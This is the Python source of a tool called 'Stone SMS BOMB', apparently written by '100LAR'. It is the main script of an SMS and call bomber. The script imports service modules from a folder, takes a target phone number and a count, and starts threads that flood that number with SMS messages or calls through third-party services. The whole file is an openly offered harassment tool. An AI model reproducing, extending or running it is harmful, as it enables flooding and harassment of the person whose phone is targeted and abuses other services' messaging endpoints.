#
# Stone SMS BOMB
#   by 100LAR
#

ver = "0.1.2"

import inspect
import logging
import os
import socket
import sys
import threading
import webbrowser

import configparser

if not os.path.exists("settings.txt"):
    config = configparser.ConfigParser()
    config.add_section("Settings")
    config.set("Settings", "call", "False")
    config.set("Settings", "service-path", "services")
    with open("settings.txt", "w") as config_file:
        config.write(config_file)

config = configparser.ConfigParser()
config.read("settings.txt")
send_calls = config.get("Settings", "call")
service_path = config.get("Settings", "service-path")

services = os.listdir(service_path)
service_classes = {}
sys.path.insert(0, service_path)

def import_services():
    for service in services:
        if service.endswith('.py') and service != 'service.py':
            module = __import__(service[:-3])
            for member in inspect.getmembers(module, inspect.isclass):
                if member[1].__module__ == module.__name__:
                    service_classes[module] = member[0]

        

def run_service(service_class, module_, phone, country_code, phone_code, sms_text, type_):
    if type_ == 'call':
        getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_call()
    else:
        getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_sms()
    sys.exit()

def start_bomb():
    send_calls_bool = True if send_calls == 'true' or send_calls == 'True' else False
    for _ in range(int(count)):
            for module_, service_class in service_classes.items():
                try:
                    _ = getattr(module_, service_class).send_call
                    if send_calls_bool:
                        threading.Thread(target=run_service,
                                            args=(service_class, module_, phone, country_code, phone_code, sms_text,
                                                'call')).start()
                except AttributeError:
                    threading.Thread(target=run_service, args=(service_class, module_, phone, country_code, phone_code, sms_text, 'sms')).start()

try:
    if sys.argv[1] == "--help":
        print("\nSTONE SMS BOMBER v"+ver)
        print("\nSMS_BOMBER.py <phone> <count>")
    else:
        import_services()
        phone = sys.argv[1]
        if len(phone)> 10:
            phone = phone[len(phone)-10:]
        try:
            count = sys.argv[2]
        except:
            count = 1
        country_code = 'ru'
        phone_code = '7'
        sms_text = 'test'
        start_bomb()
except:
    print("Import services...")
    import_services()
    print("Services : " + str(len(service_classes) ) ) 
    phone = input("\nPhone : +7")
    count = input("Count : ")
    print("\nMessages ~ " + str(len(service_classes) * int(count)))
    country_code = 'ru'
    phone_code = '7'
    sms_text = 'test'
    start_bomb()
    print("\nAll services started\nPlease wait...")
    

                                        
                                          


